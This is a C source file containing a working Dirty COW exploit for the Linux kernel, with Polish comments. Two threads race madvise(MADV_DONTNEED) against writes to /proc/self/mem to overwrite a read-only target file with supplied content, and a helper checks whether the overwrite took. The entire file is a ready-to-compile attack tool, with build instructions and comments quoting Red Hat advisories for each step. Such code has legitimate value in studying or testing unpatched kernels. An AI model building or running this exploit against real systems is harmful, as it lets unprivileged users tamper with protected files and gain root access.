/*
####################### DIRTY COW Y - brudna krowa #######################
$ gcc -pthread dirtycowy.c -o dirtycowy
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#define LOOP 100000000

void* map;
int f;
struct stat st;
size_t filesize;

char* readFileContentAndSize(char* filename, int* size) {
    char* content = NULL;

    int fd = open(filename, O_RDONLY);

    if (fd == -1) {
        printf("error opening new_content_file\n");
        return NULL;
    }

    struct stat stFile;
    fstat(fd, &stFile);

    int filesize = stFile.st_size;
    *size = filesize;

    content = (char*) malloc(sizeof(char) * (filesize + 1));
    content[filesize] = 0;

    int bytes_read = read(fd, content, filesize);

    if (bytes_read != filesize) {
        printf("error reading file, bytes_read: %d, filesize: %d\n", bytes_read, filesize);
        return NULL;
    }
    close(fd);

    return content;
}

//TODO trzeci wątek sprawdzający czy się nadpisało

int filesAreEqual(char* file1, char* file2) {
    int filesize1;
    char* content1 = readFileContentAndSize(file1, &filesize1);
    if (content1 == NULL) {
        return -1; //ERROR
    }

    int filesize2;
    char* content2 = readFileContentAndSize(file2, &filesize2);
    if (content2 == NULL) {
        return -1; //ERROR
    }

    if (filesize1 != filesize2) {
        return 0;
    }

    for (int i = 0; i < filesize1; i++) {
        char c1 = content1[i];
        char c2 = content2[i];
        if (c1 != c2) {
            return 0;
        }
    }

    return 1;
}

void* madviseThread(void* arg) {
    int i, c = 0;
    for (i = 0; i < LOOP; i++) {

/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
        c += madvise(map, filesize, MADV_DONTNEED);
    }
    printf("dupa - madviseThread thread finished - madvise %d\n\n", c);
    return NULL;
}

void* procselfmemThread(void* arg) {
    char* str;
    str = (char*) arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < LOOP; i++) {
/*
You have to reset the file pointer to the memory position.
*/
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, filesize);
    }
    printf("dupa - procselfmemThread thread finished - procselfmem %d\n\n", c);
    return NULL;
}


int main(int argc, char* argv[]) {
/*
You have to pass two arguments. File and Contents.
*/
    if (argc < 3) {
        printf("usage:\n");
        printf("dirtycowy target_file new_content_file\n");
        printf("dirtycowy --cmp file1 file2\n");
        return 1;
    }

    //opcja porównania plików
    if (argc == 4) {
        if (strcmp(argv[1], "--cmp") == 0) {
            printf("Comparing files...\n");

            int result = filesAreEqual(argv[2], argv[3]);

            if (result == -1) {
                printf("Comparing error.\n");
            } else if (result == 0) {
                printf("Files are different :(\n");
            } else if (result == 1) {
                printf("Files are equal :)\n");
            }

            return 0;
        }
    }

    pthread_t pth1, pth2;
/*
You have to open the file in read only mode.
*/
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);

    filesize = st.st_size;


    // wczytanie pliku z nowa zawartoscia
    int filesize2;
    char* newContent = readFileContentAndSize(argv[2], &filesize2);
    if (newContent == NULL) {
        return 1;
    }
    printf("New content:\n%s\n\n", newContent);


    if (filesize2 != filesize) {
        printf("warning: new file size (%d) and old file size (%d) differ\n", filesize2, (int) filesize);
        if (filesize2 > filesize) {
            filesize = filesize2;
        }else{
            return 1;
        }
    }

/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
    map = mmap(NULL, filesize, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %zx\n\n", (uintptr_t) map);

    printf("Uwaga, napierdalam race condition...\n");
/*
You have to do it on two threads.
*/
    pthread_create(&pth1, NULL, madviseThread, argv[1]);
    pthread_create(&pth2, NULL, procselfmemThread, newContent);
/*
You have to wait for the threads to finish.
*/
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    printf("done\n");
    return 0;
}
